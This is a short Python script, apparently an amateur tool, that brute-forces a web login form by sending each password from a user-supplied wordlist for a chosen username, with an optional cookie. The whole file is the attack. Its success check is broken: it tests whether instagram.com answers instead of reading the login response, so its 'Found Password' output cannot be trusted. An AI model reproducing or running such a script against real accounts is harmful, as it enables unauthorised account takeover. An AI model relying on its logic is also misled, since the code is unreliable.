#!/usr/bin/env python3

import subprocess as sub_proc
import requests
from termcolor import colored

sub_proc.call("clear", shell=True)
sub_proc.call("figlet Bruteforce | lolcat", shell=True)

url = input("[ ] URL: ")
username = input('[ ] Enter Username For The Account To Bruteforce: ')
password_list = input('[ ] Enter Password File To Use: ')
cookie_value = input('[ ]Enter Cookie Value(Optional): ')

def brute_force(url, username):
    for password in passwords:
        password = password.strip()
		
        print("Trying: " + password)

        payload = {
            "username": username,
            "password": password,
			"login": "submit"
        }

        if cookie_value != '':
            response = requests.get(url, params={'username': username,'password': password,'Login': 'Login'}, cookies = {'Cookie': cookie_value})
        else:
            response = requests.post(url, data=payload)
		
        r = requests.get('https://www.instagram.com', timeout=10)
        if r.status_code == 200:
            return True
        else:
            sub_proc.call("clear", shell=True)

            print(colored(('[+]'), 'green'), "Found Username: ==> " + colored((username), 'green'))
            print(colored(('[+]'), 'green'), "Found Password: ==> " + colored((password), 'green'))
            exit()

with open(password_list, 'r') as passwords:
    brute_force(url, username)

print('[!!] Password Not In List')
